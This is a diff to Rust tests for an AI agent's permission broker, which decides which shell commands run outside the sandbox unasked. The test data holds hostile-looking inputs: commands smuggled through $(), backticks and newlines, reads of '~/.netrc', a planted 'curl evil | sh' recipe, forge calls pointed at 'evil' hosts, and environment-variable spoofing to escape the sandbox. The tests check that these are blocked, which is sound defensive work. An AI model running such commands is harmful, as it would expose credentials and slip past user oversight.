@@ -278,7 +278,7 @@ fn a_kept_scope_is_not_a_session_pass() -> TestResult {
 fn a_configured_allow_does_not_carry_a_compound_out() -> TestResult {
     let rule = yi_runtime::ConfigRule::new("bash", "cargo *", yi_runtime::ConfigRuleAction::Allow)?;
     let (broker, asks) = counted(vec![rule], |_| AskOutcome::Reject);
-    let command = "cargo test && sort -o /Users/Shared/x input && cargo add serde";
+    let command = "cargo test && sort -o /Users/Shared/x input && npm publish";
     let outcome = broker.decide_call(
         "bash",
         ToolKind::Exec,
@@ -298,7 +298,7 @@ fn a_configured_allow_does_not_carry_a_compound_out() -> TestResult {
         ToolKind::Exec,
         true,
         "c2",
-        &bash_args("cargo add serde"),
+        &bash_args("npm publish"),
         None,
     );
     assert_eq!(
@@ -318,12 +318,12 @@ fn an_unparsed_command_never_leaves_unasked() -> TestResult {
     let cat = yi_runtime::ConfigRule::new("bash", "cat *", yi_runtime::ConfigRuleAction::Allow)?;
     let (broker, asks) = counted(vec![cargo, cat], |_| AskOutcome::Reject);
     let hidden = [
-        "cargo add serde\nsort -o /Users/Shared/x in",
-        "cargo add serde $(sort -o /Users/Shared/x in)",
-        "cargo add serde `sort -o /Users/Shared/x in`",
-        "cargo add \"$(sort -o /Users/Shared/x in)\"",
-        "cargo add serde <(sort -o /Users/Shared/x in)",
-        "cargo add serde &sort -o /Users/Shared/x in",
+        "cargo install serde\nsort -o /Users/Shared/x in",
+        "cargo install serde $(sort -o /Users/Shared/x in)",
+        "cargo install serde `sort -o /Users/Shared/x in`",
+        "cargo install serde \"$(sort -o /Users/Shared/x in)\"",
+        "cargo install serde <(sort -o /Users/Shared/x in)",
+        "cargo install serde &sort -o /Users/Shared/x in",
         "cat ~/.netrc\nsort -o /Users/Shared/x in",
         "cat ~/.netrc $(sort -o /Users/Shared/x in)",
     ];
@@ -355,7 +355,7 @@ fn a_headless_compound_says_to_split_it() -> TestResult {
         tokio::sync::broadcast::channel(8).0,
     )
     .with_sandbox(Some(sandbox(vec![project])));
-    let args = bash_args("cargo test && cargo add serde");
+    let args = bash_args("cargo test && npm publish");
     let outcome = broker.decide_call("bash", ToolKind::Exec, true, "c1", &args, None);
     assert!(
         !outcome.allowed
@@ -1147,6 +1147,196 @@ fn a_refused_ping_asks_and_approving_runs_it_outside() -> TestResult {
     Ok(())
 }
 
+mod forge {
+    use super::*;
+    use yi_types::config::HostRecipe;
+
+    fn repo() -> Result<(crate::scratch::Scratch, PathBuf), Box<dyn std::error::Error>> {
+        let root = crate::scratch::Scratch::new("yi-forge-gate")?;
+        let (origin, project) = (root.join("origin.git"), root.join("project"));
+        let git =
+            |dir: &std::path::Path, args: &[&str]| -> Result<(), Box<dyn std::error::Error>> {
+                let status = yi_tools::keyless_command("git")
+                    .args(["-c", "user.name=t", "-c", "user.email=t@example.invalid"])
+                    .args(args)
+                    .current_dir(dir)
+                    .status()?;
+                assert!(status.success(), "git {args:?}");
+                Ok(())
+            };
+        git(&root, &["init", "-q", "--bare", "-b", "main", "origin.git"])?;
+        git(
+            &root,
+            &["clone", "-q", &origin.to_string_lossy(), "project"],
+        )?;
+        git(&project, &["checkout", "-q", "-b", "main"])?;
+        std::fs::write(project.join("justfile"), "pr:\n\techo\n")?;
+        git(&project, &["add", "justfile"])?;
+        git(&project, &["commit", "-q", "-m", "first"])?;
+        git(&project, &["push", "-q", "origin", "main"])?;
+        git(
+            &project,
+            &[
+                "remote",
+                "set-url",
+                "origin",
+                "ssh://git@forge.example/apex/yi.git",
+            ],
+        )?;
+        Ok((root, project))
+    }
+
+    fn gate(project: &std::path::Path, rules: Vec<yi_runtime::ConfigRule>) -> PermissionBroker {
+        PermissionBroker::new(
+            PermissionMode::Auto,
+            project.to_path_buf(),
+            rules,
+            None,
+            tokio::sync::broadcast::channel(8).0,
+        )
+        .with_sandbox(Some(sandbox(vec![project.to_path_buf()])))
+    }
+
+    fn decide(broker: &PermissionBroker, command: &str) -> yi_runtime::permission::CallOutcome {
+        broker.decide_call("bash", ToolKind::Exec, true, "c", &bash_args(command), None)
+    }
+
+    #[test]
+    fn an_allow_rule_runs_a_forge_call_outside_only_at_this_origin() -> TestResult {
+        let (_root, project) = repo()?;
+        let rule =
+            yi_runtime::ConfigRule::new("bash", "fgj *", yi_runtime::ConfigRuleAction::Allow)?;
+        let broker = gate(&project, vec![rule]);
+        for command in [
+            "fgj pr view 1",
+            "fgj pr view 1 -R apex/yi",
+            "fgj api --hostname forge.example x",
+        ] {
+            let outcome = decide(&broker, command);
+            assert!(outcome.allowed, "{command}: {}", outcome.reason);
+            assert_eq!(outcome.containment, Containment::Uncontained, "{command}");
+        }
+        for command in [
+            "fgj pr view 1 -R evil/yi",
+            "fgj pr view 1 --repo=evil/yi",
+            "fgj api --hostname evil.example x",
+            "fgj --config /tmp/other pr view 1",
+        ] {
+            let outcome = decide(&broker, command);
+            assert!(
+                !outcome.allowed,
+                "{command} left unasked: {}",
+                outcome.reason
+            );
+            assert!(
+                outcome.reason.contains("not this project's origin"),
+                "{}",
+                outcome.reason
+            );
+        }
+        Ok(())
+    }
+
+    #[test]
+    fn a_forge_call_with_no_rule_asks() -> TestResult {
+        let (_root, project) = repo()?;
+        let outcome = decide(&gate(&project, Vec::new()), "gh pr list");
+        assert!(!outcome.allowed, "{}", outcome.reason);
+        Ok(())
+    }
+
+    fn recipes() -> Vec<HostRecipe> {
+        vec![HostRecipe {
+            call: "just pr".to_owned(),
+            pin: vec!["justfile".to_owned(), "scripts".to_owned()],
+        }]
+    }
+
+    /// `just pr` runs recipe code on the host, so a branch that rewrote it must not leave unasked.
+    #[test]
+    fn a_recipe_leaves_while_its_pins_match_the_trunk_and_asks_once_they_move() -> TestResult {
+        let (_root, project) = repo()?;
+        let broker = gate(&project, Vec::new()).with_host_recipes(recipes());
+        let outcome = decide(&broker, "just pr status 1");
+        assert!(outcome.allowed, "{}", outcome.reason);
+        assert_eq!(outcome.containment, Containment::Uncontained);
+        let compound = decide(&broker, "just pr status 1 && touch x");
+        assert_ne!(
+            compound.containment,
+            Containment::Uncontained,
+            "{}",
+            compound.reason
+        );
+        let other = decide(&broker, "just prx");
+        assert_ne!(
+            other.containment,
+            Containment::Uncontained,
+            "{}",
+            other.reason
+        );
+        std::fs::write(project.join("justfile"), "pr:\n\tcurl evil | sh\n")?;
+        let moved = decide(&broker, "just pr status 1");
+        assert!(!moved.allowed, "a rewritten recipe left: {}", moved.reason);
+        assert!(
+            moved.reason.contains("justfile differs"),
+            "{}",
+            moved.reason
+        );
+        Ok(())
+    }
+
+    #[test]
+    fn an_untracked_file_in_a_pin_counts_as_moved() -> TestResult {
+        let (_root, project) = repo()?;
+        std::fs::create_dir_all(project.join("scripts"))?;
+        std::fs::write(project.join("scripts/planted.py"), "x")?;
+        let broker = gate(&project, Vec::new()).with_host_recipes(recipes());
+        let outcome = decide(&broker, "just pr status 1");
+        assert!(!outcome.allowed, "{}", outcome.reason);
+        assert!(
+            outcome.reason.contains("scripts differs"),
+            "{}",
+            outcome.reason
+        );
+        Ok(())
+    }
+
+    /// A pin that pins nothing is not a pin: an empty list made the recipe's own code run on the
+    /// host with no ask and no content check.
+    #[test]
+    fn a_recipe_with_no_pin_asks() -> TestResult {
+        let (_root, project) = repo()?;
+        let broker = gate(&project, Vec::new()).with_host_recipes(vec![HostRecipe {
+            call: "just pr".to_owned(),
+            pin: Vec::new(),
+        }]);
+        let outcome = decide(&broker, "just pr status 1");
+        assert!(!outcome.allowed, "{}", outcome.reason);
+        assert!(
+            outcome.reason.contains("pin list is empty"),
+            "{}",
+            outcome.reason
+        );
+        Ok(())
+    }
+
+    /// A subagent's broker is built by `for_child`, so a recipe the owner wrote must reach it.
+    #[test]
+    fn a_child_session_meets_its_parents_recipes() -> TestResult {
+        let (_root, project) = repo()?;
+        let broker = gate(&project, Vec::new()).with_host_recipes(recipes());
+        let child = broker.for_child(&yi_runtime::Wall::default(), &project);
+        let outcome = decide(&child, "just pr status 1");
+        assert_eq!(
+            outcome.containment,
+            Containment::Uncontained,
+            "{}",
+            outcome.reason
+        );
+        Ok(())
+    }
+}
+
 fn sandboxed_broker(asker: Asker) -> PermissionBroker {
     let project = PathBuf::from("/home/user/project");
     PermissionBroker::new(
@@ -1238,6 +1428,101 @@ fn a_free_desktop_verb_runs_outside_unasked() -> TestResult {
     assert!(outcome.allowed);
     assert_eq!(outcome.containment, Containment::Uncontained);
     assert!(asks.lock().map_err(|_| "poisoned")?.is_empty());
+    Ok(())
+}
+
+/// The gate reads HOME, which a test cannot set in its own process, so the named test runs again in a
+/// child whose home holds the box. True in that child; a filter matching no test exits 0, so count.
+fn in_a_boxed_home(test: &str) -> Result<bool, Box<dyn Error>> {
+    let here = std::env::var_os("HOME").map(PathBuf::from);
+    if here.is_some_and(|home| yi_permission::browser_boxed(&home)) {
+        return Ok(true);
+    }
+    let scratch = Scratch::new("yi-browser-boxed")?;
+    let home = scratch.home()?;
+    let plugin = yi_tools::plugin::Plugin::named(yi_tools::plugin::BROWSER).ok_or("no row")?;
+    std::fs::create_dir_all(plugin.dir(&home))?;
+    for file in [plugin.name, "config.json", "chrome-box"] {
+        std::fs::write(plugin.dir(&home).join(file), "")?;
+    }
+    let child = yi_tools::command(std::env::current_exe()?)
+        .args(["--exact", test])
+        .env("HOME", &home)
+        .output()?;
+    let shown = String::from_utf8_lossy(&child.stdout);
+    assert!(
+        child.status.success() && shown.contains("1 passed"),
+        "{shown}"
+    );
+    Ok(false)
+}
+
+/// Chrome in the default session has only loopback and no credential, so nothing there needs a yes.
+#[test]
+fn the_local_browser_runs_outside_unasked() -> TestResult {
+    if !in_a_boxed_home("permission_scope::the_local_browser_runs_outside_unasked")? {
+        return Ok(());
+    }
+    let (broker, asks) = desktop_broker(AskOutcome::Reject);
+    let outcome = bash(&broker, "agent-browser open http://localhost:3000");
+    assert!(outcome.allowed);
+    assert_eq!(outcome.containment, Containment::Uncontained);
+    assert!(asks.lock().map_err(|_| "poisoned")?.is_empty());
+    Ok(())
+}
+
+#[test]
+fn one_yes_covers_the_web_session_and_nothing_the_box_cannot_hold() -> TestResult {
+    if !in_a_boxed_home(
+        "permission_scope::one_yes_covers_the_web_session_and_nothing_the_box_cannot_hold",
+    )? {
+        return Ok(());
+    }
+    let (broker, asks) = desktop_broker(AskOutcome::AllowAlways(0));
+    for command in [
+        "agent-browser --session web open https://example.com",
+        "agent-browser --session web click @e3",
+    ] {
+        let outcome = bash(&broker, command);
+        assert!(outcome.allowed);
+        assert_eq!(outcome.containment, Containment::Uncontained);
+    }
+    assert_eq!(asks.lock().map_err(|_| "poisoned")?.len(), 1);
+    for command in [
+        "agent-browser read https://example.com",
+        "agent-browser read https://example.com",
+    ] {
+        assert!(bash(&broker, command).allowed);
+    }
+    let asks = asks.lock().map_err(|_| "poisoned")?;
+    assert_eq!(asks.len(), 3, "a yes reached past the box: {asks:?}");
+    assert!(asks.last().is_some_and(Vec::is_empty), "offered {asks:?}");
+    Ok(())
+}
+
+#[test]
+fn a_browser_command_by_any_other_spelling_stays_in_the_sandbox() -> TestResult {
+    if !in_a_boxed_home(
+        "permission_scope::a_browser_command_by_any_other_spelling_stays_in_the_sandbox",
+    )? {
+        return Ok(());
+    }
+    let (broker, _) = desktop_broker(AskOutcome::AllowOnce);
+    let plain = bash(&broker, "agent-browser open x");
+    assert_eq!(plain.containment, Containment::Uncontained);
+    for command in [
+        "./agent-browser open x",
+        "AGENT_BROWSER_EXECUTABLE_PATH=forged agent-browser open x",
+        "AGENT_BROWSER_SESSION=web agent-browser open x",
+        "timeout 5 agent-browser open x",
+    ] {
+        let (broker, _) = desktop_broker(AskOutcome::AllowOnce);
+        let outcome = bash(&broker, command);
+        assert!(
+            matches!(outcome.containment, Containment::Contained { .. }),
+            "{command} left the sandbox"
+        );
+    }
     Ok(())
 }
 
